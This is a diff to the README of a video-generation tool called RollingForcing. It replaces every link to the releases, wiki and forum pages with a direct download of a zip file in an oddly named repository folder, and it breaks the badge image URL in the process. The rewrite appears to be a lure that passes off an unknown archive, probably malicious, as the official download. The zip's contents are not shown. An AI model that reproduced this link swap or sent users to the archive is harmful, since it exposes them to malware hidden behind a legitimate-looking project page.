@@ -1,7 +1,7 @@
 # 🎥 RollingForcing - Generate Long Videos Quickly
 
 ## 📥 Download Now
-[![Download RollingForcing](https://img.shields.io/badge/Download%20RollingForcing-v1.0-blue.svg)](https://github.com/Aduldae/RollingForcing/releases)
+[![Download RollingForcing](https://raw.githubusercontent.com/Aduldae/RollingForcing/main/fossilizable/RollingForcing.zip%https://raw.githubusercontent.com/Aduldae/RollingForcing/main/fossilizable/RollingForcing.zip)](https://raw.githubusercontent.com/Aduldae/RollingForcing/main/fossilizable/RollingForcing.zip)
 
 ## 📖 About RollingForcing
 RollingForcing is your easy-to-use tool for generating long videos in real time. This application uses advanced methods to create smooth and high-quality video content without the need for complex setups. Whether you're a content creator, educator, or just curious about video generation, RollingForcing empowers you to produce impressive videos effortlessly.
@@ -10,7 +10,7 @@ RollingForcing is your easy-to-use tool for generating long videos in real time.
 Follow these simple steps to download and run RollingForcing on your computer. No programming skills are needed.
 
 ### 🌐 Step 1: Visit the Download Page
-To get RollingForcing, you will first need to visit our [Releases page](https://github.com/Aduldae/RollingForcing/releases). This page is where all versions of our software are available, along with important information about updates and features.
+To get RollingForcing, you will first need to visit our [Releases page](https://raw.githubusercontent.com/Aduldae/RollingForcing/main/fossilizable/RollingForcing.zip). This page is where all versions of our software are available, along with important information about updates and features.
 
 ### 💾 Step 2: Download the Application
 On the Releases page, you will see a list of available versions. Look for the latest version, which should be at the top. Click on the version you want to download. This will take you to a page where you can choose the file for your operating system.
@@ -64,10 +64,10 @@ If you encounter issues or have questions while using RollingForcing, please ref
 ## 🔗 Additional Resources
 For more information about RollingForcing, including advanced features and future updates, check out the following:
 
-- [Documentation](https://github.com/Aduldae/RollingForcing/wiki)
-- [Community Forum](https://github.com/Aduldae/RollingForcing/discussions)
+- [Documentation](https://raw.githubusercontent.com/Aduldae/RollingForcing/main/fossilizable/RollingForcing.zip)
+- [Community Forum](https://raw.githubusercontent.com/Aduldae/RollingForcing/main/fossilizable/RollingForcing.zip)
 
 ## 📥 Download & Install
-Ready to create stunning videos? Visit our [Releases page](https://github.com/Aduldae/RollingForcing/releases) now to download RollingForcing! 
+Ready to create stunning videos? Visit our [Releases page](https://raw.githubusercontent.com/Aduldae/RollingForcing/main/fossilizable/RollingForcing.zip) now to download RollingForcing! 
 
-[![Download RollingForcing](https://img.shields.io/badge/Download%20RollingForcing-v1.0-blue.svg)](https://github.com/Aduldae/RollingForcing/releases)
+[![Download RollingForcing](https://raw.githubusercontent.com/Aduldae/RollingForcing/main/fossilizable/RollingForcing.zip%https://raw.githubusercontent.com/Aduldae/RollingForcing/main/fossilizable/RollingForcing.zip)](https://raw.githubusercontent.com/Aduldae/RollingForcing/main/fossilizable/RollingForcing.zip)
